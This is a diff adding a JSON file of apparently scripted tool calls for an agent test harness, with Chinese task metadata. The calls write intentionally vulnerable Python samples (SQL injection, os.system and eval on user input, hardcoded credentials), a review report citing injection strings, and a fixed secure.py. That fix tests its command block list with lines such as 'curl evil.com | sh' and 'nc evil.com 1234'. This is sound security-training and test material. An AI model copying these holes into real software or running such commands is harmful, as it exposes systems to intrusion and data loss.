@@ -1,0 +1,310 @@
+{
+  "rules": [
+    {
+      "keywords": ["E03Q4"],
+      "tools": [
+        {
+          "call_no": 1,
+          "tool": "Bash",
+          "args": {
+            "command": "echo '### 4 (review.md headings) =' && grep -c '^### ' tmpPlan/agent-test/review.md && echo '### keyword hits (密码/SQL注入/O(n²)/异常处理) =' && grep -cE '密码|SQL注入|O\\(n²\\)|异常处理' tmpPlan/agent-test/review.md"
+          }
+        }
+      ],
+      "yolo": {
+        "task_level": "medium",
+        "goal_summary": "校验 review.md 报告条目数与关键缺陷词命中数",
+        "purpose": "校验审查报告",
+        "intent": "coding",
+        "decomposition_plan": [
+          "运行 grep 双重断言统计报告完整度"
+        ]
+      },
+      "mainwork": {
+        "workflows": [
+          {
+            "id": "wf-1",
+            "name": "【E03Q4】用 grep 校验 review.md 的章节数与关键缺陷词命中数",
+            "steps": [
+              "【E03Q4】用 grep 校验 review.md 的章节数与关键缺陷词命中数"
+            ],
+            "acceptance": [
+              "产物落盘且验证通过"
+            ],
+            "delegate_to": "subagent"
+          }
+        ]
+      }
+    },
+    {
+      "keywords": ["E03Q3"],
+      "tools": [
+        {
+          "call_no": 1,
+          "tool": "Read",
+          "args": {
+            "file_path": "tmpPlan/agent-test/review_me.py"
+          }
+        },
+        {
+          "call_no": 2,
+          "tool": "Write",
+          "args": {
+            "file_path": "tmpPlan/agent-test/review.md",
+            "content": "# review_me.py 代码审查报告\n\n> 审查对象: `tmpPlan/agent-test/review_me.py`\n> 审查时间: 第三十五轮自动化测试\n> 审查范围: 4 类故意缺陷(REVIEW-M1..M4)\n\n### 1. 缺陷 ① - 硬编码密码\n- **编号**: REVIEW-M1\n- **严重度**: 高\n- **位置**: review_me.py 顶部 `DB_PASSWORD = \"admin123\"` 字面量\n- **建议**: 改用 `os.environ.get(\"DB_PASSWORD\")` 读取,本地 dotenv 兜底;提交前接入 laew 的 Secret 管理(Secret Sentinel AES-256-GCM,见专题-第十七轮)。\n- **影响面**: 任何能读到源码的人都拿到生产密钥,直接 RCE/数据清空风险。\n\n### 2. 缺陷 ② - SQL 注入 + 未校验输入类型\n- **编号**: REVIEW-M2\n- **严重度**: 高\n- **位置**: `query_user(uid)` 内 `cursor.execute(f\"SELECT * FROM users WHERE id = {uid}\")`\n- **建议**: 改用参数化 `cursor.execute(\"SELECT * FROM users WHERE id = ?\", (uid,))`;入口校验 `isinstance(uid, int)`,非 int 直接 400 而非 500。\n- **影响面**: `uid = \"1 OR 1=1\"` 全表扫,`uid = \"1; DROP TABLE users;--\"` 直接清库。\n\n### 3. 缺陷 ③ - 列表遍历 O(n²) 性能瓶颈\n- **编号**: REVIEW-M3\n- **严重度**: 中\n- **位置**: `unique_items(items)` 内 `for i in items: if i not in result: result.append(i)`\n- **建议**: 改用 `list(dict.fromkeys(items))`(O(n) 保序)或 `set(items)`(O(n) 但失序)。在 N>10000 时差距是数量级。\n- **影响面**: N=50000 时 60s+,不可用;N=500000 时直接 OOM。\n\n### 4. 缺陷 ④ - 无异常处理导致 500 崩溃\n- **编号**: REVIEW-M4\n- **严重度**: 中\n- **位置**: `process_order(order_id)` 全函数无 try/except,数据库 IO/JSON parse 任意异常直接抛出\n- **建议**: 分层捕获:`try/except (KeyError, ValueError)` 返回 400;`try/except sqlite3.Error` 返回 503;兜底 `except Exception` 记录 trace_id 后返回 500。\n- **影响面**: 单点失败 → 整个请求 500 + 内部栈泄露,既影响 SLA 也违背 OWASP A09(日志失败)。\n\n## 优先级排序\n\n1. **P0**: 缺陷 ②(SQL 注入,远程利用)\n2. **P1**: 缺陷 ①(硬编码密钥,泄露即沦陷)\n3. **P2**: 缺陷 ④(异常处理,影响可用性)\n4. **P3**: 缺陷 ③(性能,业务可观测降级)\n\n## 预估工时\n\n| 缺陷 | 修复 | 单测 | 集成测试 | 合计 |\n|------|------|------|---------|------|\n| M2 SQL 注入 + 类型校验 | 1h | 0.5h | 1h | 2.5h |\n| M1 硬编码密钥迁移 | 0.5h | 0.5h | 0.5h | 1.5h |\n| M4 异常分层处理 | 1h | 1h | 0.5h | 2.5h |\n| M3 O(n²) → O(n) | 0.25h | 0.25h | 0.5h | 1h |\n| **总计** | 2.75h | 2.25h | 2.5h | **7.5h** |\n"
+          }
+        }
+      ],
+      "yolo": {
+        "task_level": "medium",
+        "goal_summary": "为 review_me.py 编写 4 类缺陷审查报告",
+        "purpose": "编写审查报告",
+        "intent": "coding",
+        "decomposition_plan": [
+          "Read review_me.py 后 Write review.md(每缺陷 1 行编号/严重度/位置/建议 + 末尾优先级/工时 2 小节)"
+        ]
+      },
+      "mainwork": {
+        "workflows": [
+          {
+            "id": "wf-1",
+            "name": "【E03Q3】Read tmpPlan/agent-test/review_me.py 后 Write 审查报告 tmpPlan/agent-test/review.md(4 缺陷 + 优先级 + 工时)",
+            "steps": [
+              "【E03Q3】Read tmpPlan/agent-test/review_me.py 后 Write 审查报告 tmpPlan/agent-test/review.md(4 缺陷 + 优先级 + 工时)"
+            ],
+            "acceptance": [
+              "产物落盘且验证通过"
+            ],
+            "delegate_to": "subagent"
+          }
+        ]
+      }
+    },
+    {
+      "keywords": ["E03Q2"],
+      "tools": [
+        {
+          "call_no": 1,
+          "tool": "Bash",
+          "args": {
+            "command": "echo 'REVIEW count =' && grep -c 'REVIEW:' tmpPlan/agent-test/review_me.py && echo 'hardcoded password hits =' && grep -cE 'DB_PASSWORD|admin123' tmpPlan/agent-test/review_me.py"
+          }
+        }
+      ],
+      "yolo": {
+        "task_level": "medium",
+        "goal_summary": "静态扫描 review_me.py 4 类缺陷与硬编码密码命中数",
+        "purpose": "静态扫描故意缺陷",
+        "intent": "coding",
+        "decomposition_plan": [
+          "运行 grep 双断言确认 4 类缺陷 + 硬编码密码均存在"
+        ]
+      },
+      "mainwork": {
+        "workflows": [
+          {
+            "id": "wf-1",
+            "name": "【E03Q2】对 review_me.py 跑 grep,确认 4 类 REVIEW: 标记 + password= 硬编码均命中",
+            "steps": [
+              "【E03Q2】对 review_me.py 跑 grep,确认 4 类 REVIEW: 标记 + password= 硬编码均命中"
+            ],
+            "acceptance": [
+              "产物落盘且验证通过"
+            ],
+            "delegate_to": "subagent"
+          }
+        ]
+      }
+    },
+    {
+      "keywords": ["E03Q1", "E03"],
+      "tools": [
+        {
+          "call_no": 1,
+          "tool": "Write",
+          "args": {
+            "file_path": "tmpPlan/agent-test/review_me.py",
+            "content": "#!/usr/bin/env python3\n\"\"\"review_me.py — 含 4 类故意缺陷,供 code review 演练使用。\"\"\"\nimport sqlite3\n\n# REVIEW: 缺陷 ① - 硬编码密码,泄露即沦陷\nDB_PASSWORD = \"admin123\"\nDB_PATH = \"app.db\"\n\n\ndef get_conn():\n    # REVIEW: 缺陷 ④ - 无异常处理,DB 连接失败直接 500\n    return sqlite3.connect(DB_PATH)\n\n\ndef query_user(uid):\n    \"\"\"按 id 查用户。\"\"\"\n    # REVIEW: 缺陷 ② - 未校验输入类型 + SQL 注入\n    conn = get_conn()\n    cur = conn.cursor()\n    cur.execute(f\"SELECT * FROM users WHERE id = {uid}\")\n    return cur.fetchone()\n\n\ndef unique_items(items):\n    \"\"\"返回去重后列表(保留顺序)。\"\"\"\n    # REVIEW: 缺陷 ③ - O(n²) 性能瓶颈\n    result = []\n    for i in items:\n        if i not in result:\n            result.append(i)\n    return result\n\n\ndef process_order(order_id):\n    \"\"\"处理订单 - 漏洞叠加演示。\"\"\"\n    conn = get_conn()\n    cur = conn.cursor()\n    cur.execute(f\"SELECT * FROM orders WHERE id = {order_id}\")\n    row = cur.fetchone()\n    if not row:\n        # REVIEW: 缺陷 ② 衍生 - 直接返回 None 让上游 500\n        return None\n    items = [it[\"sku\"] for it in row[\"items\"]]\n    return {\n        \"order_id\": order_id,\n        \"unique_items\": unique_items(items),\n        \"auth\": DB_PASSWORD,\n    }\n\n\nif __name__ == \"__main__\":\n    # 演示路径:不直接连 DB,只看去重函数行为\n    sample = [\"a\", \"b\", \"a\", \"c\", \"b\", \"d\", \"a\"]\n    print(\"unique_items =\", unique_items(sample))\n    print(\"WARNING: insecure demo, do NOT use in production.\")\n"
+          }
+        }
+      ],
+      "yolo": {
+        "task_level": "medium",
+        "goal_summary": "生成含 4 类故意缺陷的 review_me.py 用于代码审查演练",
+        "purpose": "构造审查样例",
+        "intent": "coding",
+        "decomposition_plan": [
+          "Write 含 4 类 REVIEW: 缺陷 + 含硬编码密码的 review_me.py"
+        ]
+      },
+      "mainwork": {
+        "workflows": [
+          {
+            "id": "wf-1",
+            "name": "【E03Q1】Write tmpPlan/agent-test/review_me.py(4 类故意缺陷:硬编码密码/SQL注入/O(n²)/无异常处理)",
+            "steps": [
+              "【E03Q1】Write tmpPlan/agent-test/review_me.py(4 类故意缺陷:硬编码密码/SQL注入/O(n²)/无异常处理)"
+            ],
+            "acceptance": [
+              "产物落盘且验证通过"
+            ],
+            "delegate_to": "subagent"
+          }
+        ]
+      }
+    },
+    {
+      "keywords": ["E10Q4"],
+      "tools": [
+        {
+          "call_no": 1,
+          "tool": "Bash",
+          "args": {
+            "command": "DB_PASSWORD=test_pass_123 python3 tmpPlan/agent-test/secure.py 2>&1 | tee tmpPlan/agent-test/secure.log; echo '--- summary ---'; echo 'blocked hits =' && grep -cF 'blocked_by_whitelist' tmpPlan/agent-test/secure.log; echo 'VULN leftover =' && grep -cF 'VULN:' tmpPlan/agent-test/secure.log"
+          }
+        }
+      ],
+      "yolo": {
+        "task_level": "medium",
+        "goal_summary": "运行 secure.py 验证攻击输入被白名单拦截且无 VULN 残留",
+        "purpose": "验证白名单拦截",
+        "intent": "coding",
+        "decomposition_plan": [
+          "运行 secure.py 跑攻击输入 + grep 校验 blocked_by_whitelist"
+        ]
+      },
+      "mainwork": {
+        "workflows": [
+          {
+            "id": "wf-1",
+            "name": "【E10Q4】运行 secure.py 处理攻击输入,grep 断言 blocked_by_whitelist 命中且无 VULN: 残留",
+            "steps": [
+              "【E10Q4】运行 secure.py 处理攻击输入,grep 断言 blocked_by_whitelist 命中且无 VULN: 残留"
+            ],
+            "acceptance": [
+              "产物落盘且验证通过"
+            ],
+            "delegate_to": "subagent"
+          }
+        ]
+      }
+    },
+    {
+      "keywords": ["E10Q3"],
+      "tools": [
+        {
+          "call_no": 1,
+          "tool": "Read",
+          "args": {
+            "file_path": "tmpPlan/agent-test/insecure.py"
+          }
+        },
+        {
+          "call_no": 2,
+          "tool": "Write",
+          "args": {
+            "file_path": "tmpPlan/agent-test/secure.py",
+            "content": "#!/usr/bin/env python3\n\"\"\"secure.py — insecure.py 的修复版:subprocess 白名单 + json.loads 替代 eval + 环境变量密码。\"\"\"\nimport json\nimport os\nimport shlex\nimport subprocess\nimport sys\nfrom typing import List\n\n# 命令白名单(可执行名,不含路径),仅白名单内命令允许执行\nALLOWED_COMMANDS = {\"ls\", \"echo\", \"cat\", \"pwd\", \"whoami\", \"date\"}\n\n# 修复 ③:从环境变量读密码,缺失直接失败,不内置默认值\nDB_PASSWORD = os.environ.get(\"DB_PASSWORD\")\nif not DB_PASSWORD:\n    raise RuntimeError(\"DB_PASSWORD env var required (e.g. export DB_PASSWORD=...)\")\n\n\ndef safe_shell(cmd: str) -> str:\n    \"\"\"基于 subprocess.run([...], shell=False) + 白名单 的安全命令执行。\n\n    拒绝策略:\n      - 含 shell 元字符(| & ; > < ` $ ( ))直接拒绝\n      - argv[0] 不在白名单直接拒绝\n      - 用 timeout 兜底超时,decode_errors='replace' 防止二进制爆炸\n    \"\"\"\n    dangerous = set(\"|&;><`$()\")\n    if any(c in dangerous for c in cmd):\n        return f\"blocked_by_whitelist: dangerous shell metachar in {cmd!r}\"\n    try:\n        argv = shlex.split(cmd)\n    except ValueError as e:\n        return f\"blocked_by_whitelist: shlex parse failed: {e}\"\n    if not argv:\n        return \"blocked_by_whitelist: empty command\"\n    if argv[0] not in ALLOWED_COMMANDS:\n        return f\"blocked_by_whitelist: command {argv[0]!r} not in whitelist\"\n    try:\n        r = subprocess.run(\n            argv, shell=False, capture_output=True,\n            text=True, timeout=5,\n        )\n    except subprocess.TimeoutExpired:\n        return f\"blocked_by_whitelist: timeout after 5s: {cmd!r}\"\n    return (r.stdout + r.stderr).strip() or \"(no output)\"\n\n\ndef safe_eval_json(payload: str) -> object:\n    \"\"\"修复 ②:用 json.loads 替代 eval,严格 JSON 解析。\"\"\"\n    try:\n        return json.loads(payload)\n    except json.JSONDecodeError as e:\n        raise ValueError(f\"invalid JSON payload: {e}\") from None\n\n\ndef authenticate(user: str, password: str) -> bool:\n    \"\"\"修复 ① + ③:从环境变量读期望密码,常量时间比较防时序攻击。\"\"\"\n    expected = DB_PASSWORD\n    if not isinstance(password, str):\n        return False\n    import hmac\n    return hmac.compare_digest(password, expected)\n\n\ndef demo_attack_inputs() -> List[str]:\n    \"\"\"模拟 5 类攻击输入,验证白名单拦截。\"\"\"\n    return [\n        \"x; rm -rf /\",                       # shell 注入\n        \"ls && curl evil.com | sh\",          # 链式命令\n        \"$(whoami)\",                         # 命令替换\n        \"ls | nc evil.com 1234\",             # 管道\n        \"rm -rf /\",                          # 不在白名单\n        \"ls\",                                # 应通过\n        \"echo hello\",                        # 应通过\n    ]\n\n\nif __name__ == \"__main__\":\n    print(f\"[secure.py] DB_PASSWORD from env, length={len(DB_PASSWORD)}\")\n    for cmd in demo_attack_inputs():\n        out = safe_shell(cmd)\n        flag = \"ALLOW \" if out and not out.startswith(\"blocked_by_whitelist\") else \"BLOCK\"\n        print(f\"  {flag} {cmd!r:40s} -> {out[:80]}\")\n    # JSON 解析边界\n    print(\"[secure.py] json.loads ok:\", safe_eval_json('{\"a\": 1, \"b\": [2,3]}'))\n    print(\"OK secure.py validated\")\n"
+          }
+        }
+      ],
+      "yolo": {
+        "task_level": "medium",
+        "goal_summary": "实现 insecure.py 的命令白名单 + 安全 JSON + 环境变量密码修复版",
+        "purpose": "实现安全修复版",
+        "intent": "coding",
+        "decomposition_plan": [
+          "Read insecure.py 后 Write secure.py(subprocess 白名单 + json.loads + 环境变量)"
+        ]
+      },
+      "mainwork": {
+        "workflows": [
+          {
+            "id": "wf-1",
+            "name": "【E10Q3】Read tmpPlan/agent-test/insecure.py 后 Write 安全修复版 tmpPlan/agent-test/secure.py(白名单+json.loads+env)",
+            "steps": [
+              "【E10Q3】Read tmpPlan/agent-test/insecure.py 后 Write 安全修复版 tmpPlan/agent-test/secure.py(白名单+json.loads+env)"
+            ],
+            "acceptance": [
+              "产物落盘且验证通过"
+            ],
+            "delegate_to": "subagent"
+          }
+        ]
+      }
+    },
+    {
+      "keywords": ["E10Q2"],
+      "tools": [
+        {
+          "call_no": 1,
+          "tool": "Bash",
+          "args": {
+            "command": "echo 'VULN count =' && grep -c 'VULN:' tmpPlan/agent-test/insecure.py && echo 'os.system/eval hits =' && grep -cE 'os\\.system|eval\\(' tmpPlan/agent-test/insecure.py"
+          }
+        }
+      ],
+      "yolo": {
+        "task_level": "medium",
+        "goal_summary": "静态扫描 insecure.py 3 类漏洞标记与危险调用命中数",
+        "purpose": "静态扫描漏洞",
+        "intent": "coding",
+        "decomposition_plan": [
+          "运行 grep 双断言确认 3 类 VULN: + os.system/eval 危险调用"
+        ]
+      },
+      "mainwork": {
+        "workflows": [
+          {
+            "id": "wf-1",
+            "name": "【E10Q2】对 insecure.py 跑 grep,确认 3 类 VULN: 标记 + os.system/eval 危险调用均命中",
+            "steps": [
+              "【E10Q2】对 insecure.py 跑 grep,确认 3 类 VULN: 标记 + os.system/eval 危险调用均命中"
+            ],
+            "acceptance": [
+              "产物落盘且验证通过"
+            ],
+            "delegate_to": "subagent"
+          }
+        ]
+      }
+    },
+    {
+      "keywords": ["E10Q1"],
+      "tools": [
+        {
+          "call_no": 1,
+          "tool": "Write",
+          "args": {
+            "file_path": "tmpPlan/agent-test/insecure.py",
+            "content": "#!/usr/bin/env python3\n\"\"\"insecure.py — 含 3 类故意漏洞,供安全编程演练使用。\"\"\"\nimport os\n\n# VULN: 缺陷 ③ - 硬编码密码\nDB_PASSWORD = \"P@ssw0rd!123\"\nAPI_KEY = \"sk-1234567890abcdef\"\n\n\ndef run_user_command(user_input: str) -> int:\n    \"\"\"直接传 user_input 给 os.system,典型命令注入。\"\"\"\n    # VULN: 缺陷 ① - os.system(user_input) 命令注入\n    return os.system(user_input)\n\n\ndef evaluate_expression(user_input: str) -> object:\n    \"\"\"任意代码执行入口。\"\"\"\n    # VULN: 缺陷 ② - eval(user_input) 任意代码执行\n    return eval(user_input)\n\n\ndef authenticate(user: str, password: str) -> bool:\n    \"\"\"硬编码密码校验。\"\"\"\n    # VULN: 缺陷 ③ 衍生 - 硬编码密码对比\n    return password == DB_PASSWORD\n\n\nif __name__ == \"__main__\":\n    # 仅演示结构,实际不真执行(避免破坏沙盒)\n    print(\"[insecure.py] demo only, do NOT run with untrusted input.\")\n    print(f\"  DB_PASSWORD length = {len(DB_PASSWORD)}\")\n    print(f\"  run_user_command signature = {run_user_command.__doc__}\")\n    print(f\"  evaluate_expression signature = {evaluate_expression.__doc__}\")\n"
+          }
+        }
+      ],
+      "yolo": {
+        "task_level": "medium",
+        "goal_summary": "生成含 3 类故意漏洞的 insecure.py 用于安全编程演练",
+        "purpose": "构造漏洞样例",
+        "intent": "coding",
+        "decomposition_plan": [
+          "Write 含 3 类 VULN: 漏洞的 insecure.py"
+        ]
+      },
+      "mainwork": {
+        "workflows": [
+          {
+            "id": "wf-1",
+            "name": "【E10Q1】Write tmpPlan/agent-test/insecure.py(3 类故意漏洞:os.system注入/eval执行/硬编码密码)",
+            "steps": [
+              "【E10Q1】Write tmpPlan/agent-test/insecure.py(3 类故意漏洞:os.system注入/eval执行/硬编码密码)"
+            ],
+            "acceptance": [
+              "产物落盘且验证通过"
+            ],
+            "delegate_to": "subagent"
+          }
+        ]
+      }
+    }
+  ]
+}
